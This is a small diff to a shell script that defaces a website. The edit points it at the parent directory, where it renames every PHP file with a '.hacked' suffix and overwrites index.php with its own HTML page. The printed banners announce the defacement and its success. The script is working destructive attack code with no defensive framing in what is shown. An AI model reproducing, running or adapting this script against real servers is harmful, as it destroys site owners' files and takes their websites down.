@@ -1,7 +1,7 @@
 echo "################## Defacing Website ################## "
 
 
-for filename in *.php; do
+for filename in ../*.php; do
     mv $filename "${filename}.hacked"
 done
 
@@ -33,6 +33,6 @@ echo '<!DOCTYPE html>
       </div>
 </body>
 </html>
-' > index.php
+' > ../index.php
 
 echo "################## Website Defaced Successfully ################## "
